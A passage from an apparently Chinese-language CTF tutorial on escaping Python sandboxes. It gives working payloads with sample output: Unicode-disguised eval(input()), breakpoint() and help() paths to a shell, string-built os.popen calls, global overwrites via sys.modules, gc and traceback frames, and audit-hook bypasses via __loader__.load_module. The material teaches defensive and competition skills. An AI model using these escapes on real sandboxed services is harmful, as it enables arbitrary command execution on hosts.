chr(4434)</p></blockquote><p>当然，可以直接使用 input 函数来绕过长度限制。</p><p>打开 input 输入</p><p>如果沙箱内执行的内容是通过 input 进行传入的话（不是 web 传参），我们其实可以传入一个 input 打开一个新的输入流，然后再输入最终的 payload，这样就可以绕过所有的防护。</p><p>以 BYUCTF2023 jail a-z0-9 为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="built_in">__import__</span>(<span class="string">&quot;re&quot;</span>).sub(<span class="string">r&#x27;[a-z0-9]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">input</span>(<span class="string">&quot;code &gt; &quot;</span>).lower()))[:<span class="number">130</span>]) </span><br></pre></td></tr></table></figure><p>即使限制了字母数字以及长度，我们可以直接传入下面的 payload（注意是 unicode）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">𝘦𝘷𝘢𝘭(𝘪𝘯𝘱𝘶𝘵()) </span><br></pre></td></tr></table></figure><p>这段 payload 打开 input 输入后，我们再输入最终的 payload 就可以正常执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>) </span><br></pre></td></tr></table></figure><p>打开输入流需要依赖 input 函数，no builtins 的环境中或者题目需要以 http 请求的方式进行输入时，这种方法就无法使用了。</p><p>下面是一些<code>打开输入流</code>的方式:</p><h3 id="sys-stdin-read"><a href="#sys-stdin-read" class="headerlink" title="sys.stdin.read()"></a>sys.stdin.read()</h3><p>注意输入完毕之后按 ctrl+d 结束输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.read())</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">0</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;<span class="number">1</span></span><br><span class="line">&gt;<span class="number">2</span></span><br><span class="line">&gt;<span class="number">3</span></span><br><span class="line">&gt;<span class="number">4</span></span><br><span class="line">&gt;<span class="number">5</span></span><br><span class="line">&gt;sys.stdin.readline()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.readline())</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.stdin.readlines()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.readlines()[<span class="number">0</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>在python <span class="number">2</span>中，<span class="built_in">input</span> 函数从标准输入接收输入之后会自动 <span class="built_in">eval</span> 求值。因此无需在前面加上 <span class="built_in">eval</span>。但 raw_input 不会自动 <span class="built_in">eval</span>。</span><br></pre></td></tr></table></figure><h2 id="breakpoint-函数"><a href="#breakpoint-函数" class="headerlink" title="breakpoint 函数"></a>breakpoint 函数</h2><p>pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。</p><p>在输入 breakpoint() 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()</span><br><span class="line">--Return--</span><br><span class="line">&lt;stdin&gt;(<span class="number">1</span>)&lt;module&gt;()-&gt;<span class="literal">None</span></span><br><span class="line">(Pdb) <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">a-z0-<span class="number">9.</span>py  exp2.py  exp.py  flag.txt</span><br><span class="line"><span class="number">0</span></span><br><span class="line">(Pdb) <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">$ ls</span><br><span class="line">a-z0-<span class="number">9.</span>py  exp2.py  exp.py  flag.txt</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="help-函数"><a href="#help-函数" class="headerlink" title="help 函数"></a>help 函数</h2><p>help 函数可以打开帮助文档. 索引到 os 模块之后可以打开 sh</p><p>当我们输入 help 时，注意要进行 unicode 编码，help 函数会打开帮助（不编码也能打开）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">𝘩𝘦𝘭𝘱() </span><br><span class="line"></span><br><span class="line">然后输入 os,此时会进入 os 的帮助文档。</span><br><span class="line"></span><br><span class="line">help&gt; os </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然后再输入 !sh 就可以拿到 /bin/sh, 输入 !bash 则可以拿到 /bin/bash</span><br><span class="line"></span><br><span class="line">help&gt; os</span><br><span class="line">$ ls</span><br><span class="line">a-z0-9.py  exp2.py  exp.py  flag.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="字符串叠加"><a href="#字符串叠加" class="headerlink" title="字符串叠加"></a>字符串叠加</h2><p>参考[CISCN 2023 初赛]pyshell，通过_不断的进行字符串的叠加，再利用eval()进行一些命令的执行。</p><p>我们想执行的代码：<strong>import</strong>(“os”).popen(“tac flag”).read()</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;__import__&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;(&quot;os&quot;).p&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;open(&quot;ta&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;c flag&quot;)&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;.read()&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="变量覆盖与函数篡改"><a href="#变量覆盖与函数篡改" class="headerlink" title="变量覆盖与函数篡改"></a>变量覆盖与函数篡改</h2><p>在 Python 中，sys 模块提供了许多与 Python 解释器和其环境交互的功能，包括对全局变量和函数的操作。在沙箱中获取 sys 模块就可以达到变量覆盖与函数擦篡改的目的.</p><p>sys.modules 存放了现有模块的引用, 通过访问 sys.modules[‘<strong>main</strong>‘] 就可以访问当前模块定义的所有函数以及全局变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; aaa = &#x27;bbb&#x27;</span><br><span class="line">&gt;&gt;&gt; def my_input():</span><br><span class="line">&gt;&gt;&gt; ...     dict_global = dict()</span><br><span class="line">&gt;&gt;&gt; ...     while True:</span><br><span class="line">&gt;&gt;&gt; ...       try:</span><br><span class="line">&gt;&gt;&gt; ...           input_data = input(&quot;&gt; &quot;)</span><br><span class="line">&gt;&gt;&gt; ...       except EOFError:</span><br><span class="line">&gt;&gt;&gt; ...           print()</span><br><span class="line">&gt;&gt;&gt; ...           break</span><br><span class="line">&gt;&gt;&gt; ...       except KeyboardInterrupt:</span><br><span class="line">&gt;&gt;&gt; ...           print(&#x27;bye~~&#x27;)</span><br><span class="line">&gt;&gt;&gt; ...           continue</span><br><span class="line">&gt;&gt;&gt; ...       if input_data == &#x27;&#x27;:</span><br><span class="line">&gt;&gt;&gt; ...           continue</span><br><span class="line">&gt;&gt;&gt; ...       try:</span><br><span class="line">&gt;&gt;&gt; ...           complie_code = compile(input_data, &#x27;&lt;string&gt;&#x27;, &#x27;single&#x27;)</span><br><span class="line">&gt;&gt;&gt; ...       except SyntaxError as err:</span><br><span class="line">&gt;&gt;&gt; ...           print(err)</span><br><span class="line">&gt;&gt;&gt; ...           continue</span><br><span class="line">&gt;&gt;&gt; ...       try:</span><br><span class="line">&gt;&gt;&gt; ...           exec(complie_code, dict_global)</span><br><span class="line">&gt;&gt;&gt; ...       except Exception as err:</span><br><span class="line">&gt;&gt;&gt; ...           print(err)</span><br><span class="line">&gt;&gt;&gt; ... </span><br><span class="line">&gt;&gt;&gt; import sys</span><br><span class="line">&gt;&gt;&gt; sys.modules[&#x27;__main__&#x27;]</span><br><span class="line">&gt;&gt;&gt; &lt;module &#x27;__main__&#x27; (built-in)&gt;</span><br><span class="line">&gt;&gt;&gt; dir(sys.modules[&#x27;__main__&#x27;])</span><br><span class="line">&gt;&gt;&gt; [&#x27;__annotations__&#x27;, &#x27;__builtins__&#x27;, &#x27;__doc__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;aaa&#x27;, &#x27;my_input&#x27;, &#x27;sys&#x27;]</span><br><span class="line">&gt;&gt;&gt; sys.modules[&#x27;__main__&#x27;].aaa</span><br><span class="line">&gt;&gt;&gt; &#x27;bbb&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>除了通过 sys 模块来获取当前模块的变量以及函数外,还可以通过 __builtins__篡改内置函数等,这只是一个思路.</p><p>总体来说,只要获取了某个函数或者变量就可以篡改, 难点就在于获取.</p><h2 id="利用-gc-获取已删除模块"><a href="#利用-gc-获取已删除模块" class="headerlink" title="利用 gc 获取已删除模块"></a>利用 gc 获取已删除模块</h2><p>这个思路来源于 writeup by fab1ano – github</p><p>这道题的目标是覆盖 <strong>main</strong> 中的 <strong>exit 函数,但是题目将 sys.modules[‘__main</strong>‘] 删除了,无法直接获取.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> <span class="built_in">set</span>(sys.modules.keys()):</span><br><span class="line">    <span class="keyword">if</span> module <span class="keyword">in</span> sys.modules:</span><br><span class="line">        <span class="keyword">del</span> sys.modules[module]</span><br></pre></td></tr></table></figure><p>gc 是Python的内置模块，全名为”garbage collector”，中文译为”垃圾回收”。gc 模块主要的功能是提供一个接口供开发者直接与 Python 的垃圾回收机制进行交互。</p><p>Python 使用了引用计数作为其主要的内存管理机制，同时也引入了循环垃圾回收器来检测并收集循环引用的对象。gc 模块提供了一些函数，让你可以直接控制这个循环垃圾回收器。</p><p>下面是一些 gc 模块中的主要函数：</p><ol><li><p>gc.collect(generation&#x3D;2)：这个函数会立即触发一次垃圾回收。你可以通过 generation 参数指定要收集的代数。Python 的垃圾回收器是分代的，新创建的对象在第一代，经历过一次垃圾回收后仍然存活的对象会被移到下一代。</p></li><li><p>gc.get_objects()：这个函数会返回当前被管理的所有对象的列表。</p></li><li><p>gc.get_referrers(*objs)：这个函数会返回指向 objs 中任何一个对象的对象列表。</p></li></ol><p>exp 如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for obj in gc.get_objects():</span><br><span class="line">    if &#x27;__name__&#x27; in dir(obj):</span><br><span class="line">        if &#x27;__main__&#x27; in obj.__name__:</span><br><span class="line">            print(&#x27;Found module __main__&#x27;)</span><br><span class="line">            mod_main = obj</span><br><span class="line">        if &#x27;os&#x27; == obj.__name__:</span><br><span class="line">            print(&#x27;Found module os&#x27;)</span><br><span class="line">            mod_os = obj</span><br><span class="line">mod_main.__exit = lambda x : print(&quot;[+] bypass&quot;)</span><br></pre></td></tr></table></figure><p>在 3.11 版本和 python 3.8.10 版本中测试发现会触发 gc.get_objects hook 导致无法成功.</p><p>利用 traceback 获取模块</p><p>这个思路来源于 writeup by hstocks – github</p><p>主动抛出异常, 并获取其后要执行的代码, 然后将__exit__ 进行替换, 思路也是十分巧妙.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    _, _, tb = sys.exc_info()</span><br><span class="line">    nxt_frame = tb.tb_frame</span><br><span class="line"><span class="comment"># Walk up stack frames until we find one which</span></span><br><span class="line"><span class="comment"># has a reference to the audit function</span></span><br><span class="line"><span class="keyword">while</span> nxt_frame:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;audit&#x27;</span> <span class="keyword">in</span> nxt_frame.f_globals:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    nxt_frame = nxt_frame.f_back</span><br><span class="line"></span><br><span class="line"><span class="comment"># Neuter the __exit function</span></span><br><span class="line">nxt_frame.f_globals[<span class="string">&#x27;__exit&#x27;</span>] = <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Now we&#x27;re free to call whatever we want</span></span><br><span class="line">os.system(<span class="string">&#x27;cat /flag*&#x27;</span>)</span><br></pre></td></tr></table></figure><p>但是实际测试时使用 python 3.11 发现 nxt_frame &#x3D; tb.tb_frame 会触发 object.<strong>getattr</strong> hook. 不同的版本中触发 hook 的地方会有差异,这个 payload 可能仅在 <code>python 3.9 (题目版本)</code>中适用</p><h2 id="绕过-audit-hook"><a href="#绕过-audit-hook" class="headerlink" title="绕过 audit hook"></a>绕过 audit hook</h2><p>Python 的审计事件包括一系列可能影响到 Python 程序运行安全性的重要操作。这些事件的种类及名称不同版本的 Python 解释器有所不同，且可能会随着 Python 解释器的更新而变动。</p><p>Python 中的审计事件包括但不限于以下几类：</p><ul><li>import：发生在导入模块时。</li><li>open：发生在打开文件时。</li><li>write：发生在写入文件时。</li><li>exec：发生在执行Python代码时。</li><li>compile：发生在编译Python代码时。</li><li></li><li>ocket：发生在创建或使用网络套接字时。</li><li>os.system，os.popen等：发生在执行操作系统命令时。</li><li>subprocess.Popen，subprocess.run等：发生在启动子进程时。</li><li>PEP 578 – Python Runtime Audit Hooks</li></ul><p>calc_jail_beginner_level6 这道题中使用了 audithook 构建沙箱,采用白名单来进行限制.audit hook 属于 python 底层的实现,因此常规的变换根本无法绕过.</p><p>题目源码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">my_event, _</span>):</span><br><span class="line">    WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> my_event <span class="keyword">not</span> <span class="keyword">in</span> WHITED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation not permitted: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_event))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_input</span>():</span><br><span class="line">    dict_global = <span class="built_in">dict</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">          input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">      <span class="keyword">except</span> EOFError:</span><br><span class="line">          <span class="built_in">print</span>()</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&#x27;bye~~&#x27;</span>)</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">if</span> input_data == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">          complie_code = <span class="built_in">compile</span>(input_data, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;single&#x27;</span>)</span><br><span class="line">      <span class="keyword">except</span> SyntaxError <span class="keyword">as</span> err:</span><br><span class="line">          <span class="built_in">print</span>(err)</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">          <span class="built_in">exec</span>(complie_code, dict_global)</span><br><span class="line">      <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">          <span class="built_in">print</span>(err)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">  WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">_                _                           _       _ _   _                _   __</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | | / /</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |/ /_</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ | &#x27;_ \</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ | (_) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|\___/</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                        </span></span><br><span class="line"><span class="string">  &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  CODE = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  dict_global = dict()</span></span><br><span class="line"><span class="string">    while True:</span></span><br><span class="line"><span class="string">      try:</span></span><br><span class="line"><span class="string">          input_data = input(&quot;&gt; &quot;)</span></span><br><span class="line"><span class="string">      except EOFError:</span></span><br><span class="line"><span class="string">          print()</span></span><br><span class="line"><span class="string">          break</span></span><br><span class="line"><span class="string">      except KeyboardInterrupt:</span></span><br><span class="line"><span class="string">          print(&#x27;bye~~&#x27;)</span></span><br><span class="line"><span class="string">          continue</span></span><br><span class="line"><span class="string">      if input_data == &#x27;&#x27;:</span></span><br><span class="line"><span class="string">          continue</span></span><br><span class="line"><span class="string">      try:</span></span><br><span class="line"><span class="string">          complie_code = compile(input_data, &#x27;&lt;string&gt;&#x27;, &#x27;single&#x27;)</span></span><br><span class="line"><span class="string">      except SyntaxError as err:</span></span><br><span class="line"><span class="string">          print(err)</span></span><br><span class="line"><span class="string">          continue</span></span><br><span class="line"><span class="string">      try:</span></span><br><span class="line"><span class="string">          exec(complie_code, dict_global)</span></span><br><span class="line"><span class="string">      except Exception as err:</span></span><br><span class="line"><span class="string">          print(err)</span></span><br><span class="line"><span class="string">  &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;White list of audit hook ===&gt; builtins.input,builtins.input/result,exec,compile&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Some code of python jail:&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(CODE)</span><br><span class="line">  my_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  sys.addaudithook(my_audit_hook)</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure><p>这道题需要绕过的点有两个:</p><p>绕过 import 导入模块. 如果直接使用 import,就会触发 audithook</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>)</span><br><span class="line"> Operation <span class="keyword">not</span> permitted: <span class="keyword">import</span></span><br><span class="line"></span><br><span class="line">绕过常规的命令执行方法执行命令. 利用 os, subproccess 等模块执行命令时也会触发 audithook</span><br></pre></td></tr></table></figure><p>调试技巧</p><p>本地调试时可以在 hook 函数中添加打印出 hook 的类型.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">my_event, _</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] <span class="subst">&#123;my_event&#125;</span>, <span class="subst">&#123;_&#125;</span>&#x27;</span>)</span><br><span class="line">    WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> my_event <span class="keyword">not</span> <span class="keyword">in</span> WHITED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation not permitted: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_event))</span><br></pre></td></tr></table></figure><p>这样在测试 payload 时就可以知道触发了哪些 hook</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">[+] builtins.<span class="built_in">input</span>/result, (<span class="string">&#x27;import os&#x27;</span>,)</span><br><span class="line">[+] <span class="built_in">compile</span>, (<span class="string">b&#x27;import os&#x27;</span>, <span class="string">&#x27;&lt;string&gt;&#x27;</span>)</span><br><span class="line">[+] <span class="built_in">exec</span>, (&lt;code <span class="built_in">object</span> &lt;module&gt; at <span class="number">0x7f966795bec0</span>, file <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>&gt;,)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__loader__.load_module 导入模块</span><br><span class="line"></span><br><span class="line">__loader__.load_module(fullname) 也是 python 中用于导入模块的一个方法并且不需要导入其他任何库.</span><br><span class="line"></span><br><span class="line"> __loader__.load_module(<span class="string">&#x27;os&#x27;</span>) </span><br><span class="line"></span><br><span class="line">__loader__ 实际上指向的是 _frozen_importlib.BuiltinImporter 类,也可以通过别的方式进行获取</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="number">84</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br><span 